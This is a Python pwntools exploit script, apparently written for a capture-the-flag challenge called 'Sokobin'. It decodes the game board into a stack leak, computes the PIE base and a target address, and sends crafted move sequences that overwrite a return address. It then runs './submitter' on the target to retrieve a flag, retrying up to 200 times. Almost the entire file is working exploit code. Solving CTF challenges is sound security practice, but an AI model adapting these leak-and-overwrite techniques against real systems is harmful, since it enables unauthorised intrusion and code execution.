#!/usr/bin/python3

from pwn import *
# from ctypes import CDLL


def connect():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    p = remote(HOST, int(PORT))
    return p


def main():
    p = connect()
    p.recvuntil(b"Sokobin!\n")
    stones = b""
    for i in range(32):
        stones += p.recvline().strip()[::-1]
    print(stones)

    stack_leak = int(stones.replace(b".", b"0").replace(
        b"o", b"1").replace(b"@", b"0"), 2)
    leak_bytes = stack_leak.to_bytes(32*4, 'little')

    # print(stack_leak.to_bytes(32*4, 'little'))

    # print("stack:", hex(u64(leak_bytes[8:16])))
    # print("pie:", hex(u64(leak_bytes[72:80])))
    # print("libc:", hex(u64(leak_bytes[40:48])))

    # elf.symbols["main"] = 4724
    # print(elf.symbols["main"])
    address = u64(leak_bytes[72:80]) - 4724
    goal_address = address + 0x1250

    print(hex(goal_address))
    print(bin(goal_address)[2:].rjust(64, "0")[:32][::-1])
    print(bin(goal_address)[2:].rjust(64, "0")[32:64][::-1])

    top_goal = bin(goal_address)[2:].rjust(64, "0")[:32][::-1]
    lower_goal = bin(goal_address)[2:].rjust(64, "0")[32:64][::-1]

    # for i in range(0, 32*4-4, 8):
    #     print(i, hex(u64(leak_bytes[i:i+8])))

    p.sendline(b"ssssssssssssssssswaaaaaaaaa")
    p.sendline(b"ssssssssaws")
    # organize the return address range
    p.sendline(b"awwww" + b"a"*32 + b"w" + b"s"*32 + b"w" +
               b"a"*32 + b"r" + b"a"*32 + b"ww" + b"s"*32 + b"r" + b"s"*32 + b"wwwwwwrrrr" + b"a"*32 + b"s"*32)
    p.sendline(b"w"+b"wwwwwrrrrra"*32 + b"s"*32 + b"r")
    p.sendline(b"a"*32+b"r"+b"a"*32+b"rrr"+b"swr" *
               32+b"a"*32+b"ww"+b"s"*32+b"a"*32+b"r")

    payload = b""
    for i in range(16):
        if top_goal[i] == "1":
            if lower_goal[i] == "1":
                payload += b"wr"
            else:
                payload += b"wwrr"
        else:
            if lower_goal[i] == "1":
                payload += b"wwwwswwarrrrrarrswwr"
            else:
                payload += b"wwwrrr"
        payload += b"s"
    p.sendline(payload)
    p.sendline(b"wwwwrrrrs"*16+b"wwwwww"+b"a"*17+b"s"*32+b"wra"*16+b"awwss")
    payload = b""
    for i in range(16, 31):
        if lower_goal[i] == "1":
            payload += b"rrrrrwwwww"
        payload += b"s"
    if lower_goal[31] == "1":
        payload += b"wsrrrrrrwwwwww"
    p.sendline(payload)

    context.log_level = "CRITICAL"

    p.sendline(b"q")
    p.sendline(b"./submitter")
    res = p.recvall(timeout=1)
    if b"flag" in res or b"FLAG" in res or b"Flag" in res:
        print(res)
        exit()
    print(res[-100:])


if __name__ == "__main__":
    for i in range(200):
        main()
